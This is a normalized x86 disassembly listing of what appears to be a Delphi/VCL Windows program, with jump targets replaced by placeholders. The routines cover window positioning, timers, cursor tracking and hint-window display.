mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
xor ecx ecx
push ebp
push sub_458bd8
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
mov eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call MessageBoxA
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458bdf
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
or esi 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x14 ]
call sub_44e41c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x20 ]
call sub_44e27c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_458bec
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458ca7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404edc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4582c8
mov eax [ ebp - 0x108 ]
call sub_405324
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx eax
mov eax ebx
pop ecx
call sub_458a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458cae
lea eax [ ebp - 0x108 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
call sub_40a070
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_4039f4
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_403634
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
sub_458cc4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov esi eax
xor edi edi
mov [ esp + 0x4 ] 0x1
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax esi
call sub_458de8
mov ebx eax
test bl bl
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ esp + 0x4 ] 0x0
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_443f88
test al al
je r-xdata
mov eax edi
call sub_443e20
cmp ax 0xffff
jne r-xdata
cmp [ esi + 0xac ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x284 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
movzx eax bp
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_459498
test al al
je r-xdata
call sub_443be8
mov [ esp + 0x8 ] eax
mov eax edi
call sub_443be8
mov [ esp + 0x8 ] eax
mov eax esi
call sub_459498
test al al
je r-xdata
cmp [ edi + 0x268 ] 0x0
jne r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x284 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x4 ] 0x0
sub_458de8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
test eax eax
je r-xdata
test bl bl
jne r-xdata
xor edx edx
call sub_44e778
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
test eax eax
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x11a ] 0x0
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov ebx eax
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
sub_458eb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_458f32
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_405324
mov ecx eax
mov dx 0x102
mov eax esi
call sub_458de8
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f39
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax esi
call sub_459498
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_459df0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
sub_458f44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_458fbb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
mov dx 0x1
mov eax esi
call sub_458de8
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458fc2
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax esi
call sub_459498
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_459df0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
sub_458fe4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403f64
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43c2e8
jmp r-xdata
sub_459034
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_455ff0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_443be8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_455fdc
mov ebx eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax ebx
call sub_443be8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
sub_459098
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43a6b0
cmp eax [ ebx + 0x48 ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov [ ebx + 0x48 ] eax
sub_4590bc
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_459101
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push eax
push 0x0
call KillTimer
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_459034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_459124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459271
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_459098
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_456ba0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_438e4c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_459320
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_459218
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x12a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov eax [ ebp - 0x4 ]
call sub_4596f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc0 ]
test ebx ebx
jg r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_459034
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41d278
test al al
je r-xdata
push sub_4590bc
push ebx
push 0x0
push 0x0
call SetTimer
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459278
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_459034
sub_459280
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_455fd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_455fc0
movzx edx di
xor ecx ecx
call sub_43d400
inc esi
dec ebx
jne r-xdata
sub_4592bc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4580a0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4580a0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_459280
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_459320
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_405270
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404e98
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42eb44
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bebc
xor eax eax
push ebp
push sub_4593a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
jmp r-xdata
sub_4593b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_459410
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_455fd4
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4593b4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_455fc0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4593b4
pop ecx
jmp r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax [ ebx + 0x1c4 ]
push eax
mov eax ebx
call sub_443be8
push eax
call IsChild
test eax eax
jne r-xdata
sub_4594b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4594fc
push sub_456bf8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4596f0
sub_459524
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp ecx
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx eax [ esp + 0xe ]
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_43bbc8
lea eax [ esp + 0x24 ]
mov dl 0x1
call sub_43a6b0
call sub_456bd8
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_4596f0
jmp r-xdata
cmp [ edi + 0x8d ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x60 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
movsx eax [ esp + 0x1a ]
mov [ esp + 0x20 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_43bbc8
push [ esp + 0x28 ]
push [ esp + 0x28 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
neg eax
mov al 0x1
jmp r-xdata
movzx ebx [ esi + 0x58 ]
test bl bl
je r-xdata
test al al
je r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4596f0
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4594b8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
movzx ecx bl
mov edx 0xb041
mov eax edi
call sub_43d400
test bl bl
je r-xdata
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
lea eax [ esp + 0x4 ]
push eax
call GetCursorPos
lea edx [ esp + 0x4 ]
mov eax esi
call sub_459990
jmp r-xdata
sub_459644
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4594fc
movzx eax [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_459990
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45967c
jmp r-xdata
sub_45967c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443f88
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_443be8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
test al al
je r-xdata
mov cl 0x1
mov edx [ ebx + 0x74 ]
mov eax ebx
call sub_4594b8
push 0x0
mov eax [ ebx + 0x84 ]
call sub_443be8
push eax
call ShowWindow
xor edx edx
mov eax [ ebx + 0x84 ]
call sub_43c068
jmp r-xdata
sub_4596f0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45967c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_456d60
mov eax ebx
call sub_4594fc
sub_459728
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45986c
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_42581c
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_402d10
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45983d
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4258d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459844
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402d44
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_459718
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_459718
mov [ ebp - 0x4 ] eax
sub_459844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_459880
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403f64
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403e3c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4598e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_45997e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459985
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404f34
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x250 ]
mov edx [ ebp - 0x4 ]
call sub_4243b8
mov edi eax
cmp edi [ ebp - 0x8 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] edi
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40e7c8
mov ebx eax
inc ebx
sub_459990
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_4059d4
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_459d17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4596f0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4594b8
jmp r-xdata
call sub_44e534
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d1e
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_405aa4
retn
lea eax [ ebp - 0x4c ]
mov dl 0x1
call sub_43a6b0
call sub_456bd8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
call sub_459728
add [ ebp - 0x38 ] eax
mov eax [ rw-data ]
call sub_455f54
mov [ ebp - 0x34 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ba58
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43bc78
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_456ba0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_438e08
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0xc ]
call sub_404edc
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43d400
test eax eax
sete [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x0
je r-xdata
cmp [ esi + 0x1c4 ] 0x0
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x15a ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ esi + 0x1c4 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5d ]
lea edx [ ebp - 0xc ]
mov esi [ ebx ]
mov eax [ esi + 0x15c ]
call [ esi + 0x158 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x40 ]
call sub_459880
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
movzx edx [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x6d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov esi [ eax ]
call [ esi + 0xe8 ]
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x6d ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc7
call sub_404160
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
